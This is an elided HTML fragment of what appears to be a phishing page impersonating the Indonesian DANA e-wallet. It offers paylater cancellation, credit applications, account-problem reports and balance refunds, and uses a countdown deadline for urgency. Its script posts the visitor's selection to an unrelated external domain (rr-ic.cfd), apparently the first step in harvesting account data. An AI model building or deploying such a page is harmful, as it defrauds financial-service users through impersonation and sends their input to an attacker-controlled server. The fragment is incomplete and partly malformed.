...
<meta charset="UTF-8">
 ...
 <meta property="og:image" content="https://hosting.tigerengine.id/rrwwxd.png">
  ...
  <meta name="twitter:title" content="𝗗𝗔𝗡𝗔 | DOMPET DIGITAL DANA">
  ...
  <meta name="twitter:image" content="https://hosting.tigerengine.id/rrwwxd.png">
...
.s:active{
 ...
 <center>
       <label class="aha">
       <input type="radio" id="btn1" name="tarif" value="PEMBATALAN PINJAMAN PAYLATER" onclick="letsgo1()"/>
    <span class="s">PEMBATALAN PINJAMAN PAYLATER</span>
		</label>
  <label class="aha">
   <input type="radio" id="btn2" name="tarif" value="PENGAJUAN PAYLATER/DANA CICIL" onclick="letsgo1()">
   <sp class="s">PENGAJUAN PAYLATER/DANA CICIL</span>
   </label>
   <label class="aha">
   <input type="radio" id="btn3" name="tarif" value="LAPORKAN KENDALA AKUN" onclick="letsgo1()">
   <sp class="s">LAPORKAN KENDALA AKUN</span>
   </label>
   <label class="aha">
   <input type="radio" id="btn4" name="tarif" value="REFUND SALDO DANA" onclick="letsgo1()">
   <sp class="s">REFUND SALDO DANA</span>
   </label>
<br/>
...
<!-- partial -->
  <script>
let tglNow = new Date();
let waktuBatas = new Date("2025-04-16T23:59:59");
...
var tarif = $('input[name="tarif"]:checked').val();
 ...
 event.preventDefault();
      $("#process1").fadeIn(); 
        $.ajax({
            type: 'POST',
            url: 'https://rr-ic.cfd/z0me/xx/tarif.php',
